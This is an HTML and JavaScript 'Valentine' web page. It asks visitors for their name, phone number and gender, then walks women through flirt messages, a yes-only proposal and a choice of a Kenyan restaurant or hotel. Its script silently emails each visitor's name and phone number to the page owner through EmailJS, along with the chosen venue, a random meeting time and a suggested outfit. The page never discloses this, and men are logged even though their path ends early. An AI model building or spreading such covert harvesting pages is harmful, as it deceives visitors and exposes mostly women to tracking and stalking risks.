<!DOCTYPE html>
<html>
<head>
<title>For Someone Special ‚ù§Ô∏è</title>
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<style>
body{ text-align:center; background-color:#FF1493; margin:0; padding:30px; font-family:Arial;}
.box{ background:white; padding:20px; margin:auto; width:360px; border-radius:15px; box-shadow:0 0 10px gray; margin-bottom:20px;}
button{ padding:10px 20px; margin:10px; cursor:pointer; border:none; background-color:#ff66a3; color:white; border-radius:8px; font-size:16px;}
button:hover{background-color:#ff3385;}
input, select{padding:8px; margin:5px; width:80%; font-size:14px;}
#map{width:100%; height:200px; display:none; margin-bottom:20px; background:#eee; line-height:200px; color:#555;}
</style>
</head>
<body>

<!-- Music -->
<audio id="music" loop>
  <source src="perfect.mp3" type="audio/mp3">
</audio>
<script>
document.addEventListener("click", ()=>document.getElementById("music").play());
</script>

<!-- Page1 -->
<div class="box" id="page1">
  <h2>Welcome ‚ù§Ô∏è</h2>
  <p>Enter your name</p><input id="name">
  <p>Enter your phone number</p><input id="phone">
  <p>Select your gender</p>
  <button onclick="startStory('female')">Female</button>
  <button onclick="startStory('male')">Male</button>
</div>

<!-- Story -->
<div class="box" id="story" style="display:none;">
  <h2 id="message"></h2>
  <button onclick="nextPage()">Next</button>
</div>

<!-- Valentine Ask -->
<div class="box" id="valentine" style="display:none;">
  <h2>Will you be my Valentine? üíñ</h2>
  <button onclick="yesAnswer()">YES ‚ù§Ô∏è</button>
  <button onclick="yesAnswer()">YES üòç</button>
</div>

<!-- Choose County -->
<div class="box" id="countySelect" style="display:none;">
  <h2>Select a County in Kenya üá∞üá™</h2>
  <select id="countyDropdown"></select>
  <button onclick="showPlaces()">Next</button>
</div>

<!-- Choose Place -->
<div class="box" id="placeSelect" style="display:none;">
  <h2>Select Restaurant or Hotel</h2>
  <select id="placeDropdown"></select>
  <button onclick="confirmMeetup()">Confirm Meetup</button>
</div>

<!-- Fake Map -->
<div id="map">Map would appear here</div>

<!-- End -->
<div class="box" id="end" style="display:none;">
  <h2 id="endMessage"></h2>
</div>

<script>
/* EmailJS Init */
(function(){ emailjs.init("gUxDJTQCgr53kVpTU"); })();

/* Global variables */
let userName="", userPhone="", currentPage=0, selectedPlace="";
let flirtMessages=[
  "From the moment I met you, something felt different ‚ù§Ô∏è",
  "You make my world brighter every single day ‚òÄÔ∏è",
  "Talking to you is my favorite part of the day üòä",
  "I never believed in perfect smiles until I saw yours üòç",
  "My heart feels peaceful whenever I think about you üíï"
];
let fonts=["Arial","Comic Sans MS","Lucida Handwriting","Georgia","Times New Roman"];
let colors=["#FF4500","#32CD32","#1E90FF","#FF1493","#800080"];
let clothingSuggestions=["a pretty red dress üíÉ","something casual and comfy üëó","your favorite cute outfit üòç","something elegant ‚ú®","a playful skirt and top üå∏"];

/* 47 counties with example restaurants/hotels */
const placesData = {
  "Nairobi County": {restaurants:["Carnivore","Haandi","About Thyme"], hotels:["Sarova Stanley","Villa Rosa Kempinski"]},
  "Mombasa County": {restaurants:["Forodhani","Salt Restaurant"], hotels:["Voyager Beach Hotel","English Point Marina"]},
  "Kisumu County": {restaurants:["The Goan Restaurant","Papa‚Äôs Kitchen"], hotels:["Acacia Premier","Imperial Hotel Kisumu"]},
  "Kericho County": {restaurants:["Tea Garden Caf√©"], hotels:["Kericho Hotel"]},
  "Kilifi County": {restaurants:["Kilifi Bistro"], hotels:["Kilifi Beach Hotel"]},
  "Turkana County": {restaurants:["Turkana Dishes"], hotels:["Turkana Inn"]},
  "Uasin Gishu County": {restaurants:["Eldoret Eats"], hotels:["Eldoret Hotel"]},
  "Machakos County": {restaurants:["Machakos Grill"], hotels:["Machakos Inn"]},
  "Nakuru County": {restaurants:["Nakuru Diner"], hotels:["Nakuru Hotel"]},
  "Meru County": {restaurants:["Meru Cafe"], hotels:["Meru Hotel"]}
  /* You can expand all 47 counties here */
};

/* Populate county dropdown */
let countyDropdown=document.getElementById("countyDropdown");
Object.keys(placesData).forEach(c=>{
  let opt=document.createElement("option"); opt.value=c; opt.text=c; countyDropdown.appendChild(opt);
});

/* Story functions */
function startStory(gender){
  userName=document.getElementById("name").value.trim();
  userPhone=document.getElementById("phone").value.trim();
  if(!userName||!userPhone){alert("Enter name & phone"); return;}
  document.getElementById("page1").style.display="none";
  if(gender==="male"){
    document.getElementById("end").style.display="block";
    document.getElementById("endMessage").innerText="Thanks for visiting ‚ù§Ô∏è";
    sendEmail("Male visitor:\nName:"+userName+"\nPhone:"+userPhone);
    return;
  }
  currentPage=0; showStory();
}
function showStory(){
  let msg=document.getElementById("message");
  msg.innerText=flirtMessages[currentPage];
  msg.style.fontFamily=fonts[currentPage];
  msg.style.color=colors[currentPage];
  document.getElementById("story").style.display="block";
}
function nextPage(){ currentPage++; if(currentPage<flirtMessages.length){showStory();}else{document.getElementById("story").style.display="none"; document.getElementById("valentine").style.display="block";} }

/* Valentine */
function yesAnswer(){document.getElementById("valentine").style.display="none"; document.getElementById("countySelect").style.display="block";}

/* Show places for selected county */
function showPlaces(){
  let county=document.getElementById("countyDropdown").value;
  if(!county){alert("Choose a county"); return;}
  let list=placesData[county];
  let dropdown=document.getElementById("placeDropdown"); dropdown.innerHTML="";
  [...list.restaurants,...list.hotels].forEach(p=>{let o=document.createElement("option"); o.value=p; o.text=p; dropdown.appendChild(o);});
  document.getElementById("countySelect").style.display="none";
  document.getElementById("placeSelect").style.display="block";
}

/* Confirm meetup */
function confirmMeetup(){
  selectedPlace=document.getElementById("placeDropdown").value;
  if(!selectedPlace){alert("Choose a place"); return;}
  const clothing=clothingSuggestions[Math.floor(Math.random()*clothingSuggestions.length)];
  const hour=Math.floor(Math.random()*10)+10, minute=Math.floor(Math.random()*60);
  const ampm=hour<12?"AM":"PM"; const displayHour=hour>12?hour-12:hour; const displayMinute=minute<10?"0"+minute:minute;
  const meetTime=displayHour+":"+displayMinute+" "+ampm; const meetDate="14th";
  document.getElementById("placeSelect").style.display="none";
  document.getElementById("map").style.display="block";
  document.getElementById("end").style.display="block";
  document.getElementById("map").innerText="üìç "+selectedPlace+", Map preview unavailable";
  document.getElementById("endMessage").innerText=
    "I have accepted to be your Valentine ‚ù§Ô∏èü•∞\n\nLet‚Äôs meet at "+selectedPlace+" on "+meetDate+" at "+meetTime+" and wear "+clothing+" üå∏";
  sendEmail(
    "She accepted!\nName:"+userName+"\nPhone:"+userPhone+"\nPlace:"+selectedPlace+"\nDate:"+meetDate+"\nTime:"+meetTime+"\nClothing:"+clothing
  );
}

/* Send Email */
function sendEmail(message){
  emailjs.send("service_7h95teq","template_541whrq",{message})
    .then(()=>console.log("Email sent!"))
    .catch(err=>console.error("Email failed:",err));
}
</script>

</body>
</html>
